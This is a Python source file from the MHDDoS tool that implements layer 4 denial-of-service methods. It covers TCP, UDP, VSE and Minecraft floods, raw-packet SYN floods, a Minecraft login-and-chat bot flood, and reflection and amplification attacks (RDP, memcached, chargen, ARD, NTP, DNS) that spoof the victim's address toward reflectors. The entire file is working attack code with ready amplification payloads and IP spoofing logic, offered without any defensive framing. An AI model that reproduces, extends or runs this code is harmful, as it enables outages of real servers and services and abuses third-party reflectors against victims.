"""
Implementations of layer 4 attack methods of MHDDoS.
"""
import time
from contextlib import suppress
from itertools import cycle
from os import urandom as randbytes
from random import choice, randbytes
from random import randint
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, socket)
from struct import pack as data_pack
from threading import Event, Thread
from time import sleep
from typing import Any, List, Set, Tuple
from uuid import UUID, uuid4

from PyRoxy import Proxy
from PyRoxy import Tools as PyRoxyTools
from impacket.ImpactPacket import IP, TCP, UDP, Data

# noinspection PyBroadException
from MHDDoS.methods.tools import Tools
from MHDDoS.utils.misc import Counter


class Layer4(Thread):
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle
    _proxies: List[Proxy] = None
    _requests_sent: Counter = None
    _bytes_sent: Counter = None
    _last_request_timestamp: Counter = None

    def __init__(self,
                 target: Tuple[str, int],
                 ref: List[str] = None,
                 method: str = "TCP",
                 synevent: Event = None,
                 proxies: List[Proxy] = None,
                 bytes_sent_counter: Counter = None,
                 requests_sent_counter: Counter = None,
                 last_request_timestamp: Counter = None):
        Thread.__init__(self, daemon=True)
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self._method = method
        self._target = target
        self._synevent = synevent
        if proxies:
            self._proxies = list(proxies)

        self._bytes_sent = bytes_sent_counter
        self._requests_sent = requests_sent_counter
        self._last_request_timestamp = last_request_timestamp

    def run(self) -> None:
        if self._synevent:
            self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            with suppress(Exception):
                while self._synevent.is_set():
                    self.SENT_FLOOD()

    def get_effective_socket(self,
                             conn_type=AF_INET,
                             sock_type=SOCK_STREAM,
                             proto_type=IPPROTO_TCP):
        if self._proxies:
            return choice(self._proxies).open_socket(
                conn_type, sock_type, proto_type)
        return socket(conn_type, sock_type, proto_type)

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        if name == "UDP":
            self.SENT_FLOOD = self.UDP
        if name == "SYN":
            self.SENT_FLOOD = self.SYN
        if name == "VSE":
            self.SENT_FLOOD = self.VSE
        if name == "MINECRAFT":
            self.SENT_FLOOD = self.MINECRAFT
        if name == "MCBOT":
            self.SENT_FLOOD = self.MCBOT
        if name == "RDP":
            self._amp_payload = (
                b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
                3389)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "MEM":
            self._amp_payload = (
                b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "CHAR":
            self._amp_payload = (b'\x01', 19)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "ARD":
            self._amp_payload = (b'\x00\x14\x00\x00', 3283)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "NTP":
            self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "DNS":
            self._amp_payload = (
                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00', 53)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())

    def TCP(self) -> None:
        # global _bytes_sent, _requests_sent
        try:
            with self.get_effective_socket(AF_INET, SOCK_STREAM) as s:
                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                s.connect(self._target)
                while s.send(randbytes(1024)):
                    self._bytes_sent += 1024
                    self._requests_sent += 1
                    self._last_request_timestamp.set(time.time())
        except Exception:
            s.close()

    def MINECRAFT(self) -> None:
        # global _bytes_sent, _requests_sent
        payload = Minecraft.handshake(self._target, 74, 1)
        try:
            with self.get_effective_socket(AF_INET, SOCK_STREAM) as s:
                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                s.connect(self._target)

                s.send(payload)
                self._bytes_sent += len(payload)

                while s.send(b'\x01'):
                    s.send(b'\x00')
                    self._bytes_sent += 2
                    self._requests_sent += 2
                    self._last_request_timestamp.set(time.time())

        except Exception:
            s.close()

    def UDP(self) -> None:
        # global _bytes_sent, _requests_sent
        try:
            with socket(AF_INET, SOCK_DGRAM) as s:
                while s.sendto(randbytes(1024), self._target):
                    self._bytes_sent += 1024
                    self._requests_sent += 1
                    self._last_request_timestamp.set(time.time())

        except Exception:
            s.close()

    def SYN(self) -> None:
        # global _bytes_sent, _requests_sent
        payload = self._genrate_syn()
        try:
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                while s.sendto(payload, self._target):
                    self._bytes_sent += len(payload)
                    self._requests_sent += 1
                    self._last_request_timestamp.set(time.time())

        except Exception:
            s.close()

    def AMP(self) -> None:
        # global _bytes_sent, _requests_sent
        payload = next(self._amp_payloads)
        try:
            with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                while s.sendto(*payload):
                    self._bytes_sent += len(payload[0])
                    self._requests_sent += 1
                    self._last_request_timestamp.set(time.time())

        except Exception:
            s.close()

    def MCBOT(self) -> None:
        # global _bytes_sent, _requests_sent
        login = Minecraft.login("MHDDoS_" + PyRoxyTools.Random.rand_str(5))
        handshake = Minecraft.handshake_forwarded(self._target,
                                                  47,
                                                  2,
                                                  PyRoxyTools.Random.rand_ipv4(),
                                                  uuid4())
        try:
            with self.get_effective_socket(AF_INET, SOCK_STREAM) as s:
                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                s.connect(self._target)

                s.send(handshake)
                s.send(login)
                self._bytes_sent += (len(handshake + login))
                self._requests_sent += 2
                self._last_request_timestamp.set(time.time())

                while s.recv(1):
                    keep = Minecraft.keepalive(randint(1000, 123456))
                    s.send(keep)
                    self._bytes_sent += len(keep)
                    self._requests_sent += 1
                    self._last_request_timestamp.set(time.time())
                    c = 5
                    while c:
                        chat = Minecraft.chat(PyRoxyTools.Random.rand_str(255))
                        s.send(chat)
                        self._bytes_sent += len(chat)
                        self._requests_sent += 1
                        self._last_request_timestamp.set(time.time())
                        sleep(1.2)
                        c -= 1

        except Exception:
            s.close()

    def VSE(self) -> None:
        # global _bytes_sent, _requests_sent
        payload = (
            b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
            b'\x20\x51\x75\x65\x72\x79\x00')
        try:
            with socket(AF_INET, SOCK_DGRAM) as s:
                while s.sendto(payload, self._target):
                    self._bytes_sent += len(payload)
                    self._requests_sent += 1
                    self._last_request_timestamp.set(time.time())
        except Exception:
            s.close()

    def _genrate_syn(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(Tools.getMyIPAddress())
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(randint(1, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)

            ud: UDP = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])

            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)

            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads


class Minecraft:
    @staticmethod
    def varint(d: int) -> bytes:
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b''.join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(integer: int) -> bytes:
        return data_pack('>H', integer)

    @staticmethod
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(target[0].encode()),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(
                                  target[0].encode(),
                                  b"\x00",
                                  ip.encode(),
                                  b"\x00",
                                  uuid.hex.encode()
                              ),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def login(username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.data(username))

    @staticmethod
    def keepalive(num_id: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(num_id))

    @staticmethod
    def chat(message: str) -> bytes:
        return Minecraft.data(Minecraft.varint(0x01),
                              Minecraft.data(message.encode()))
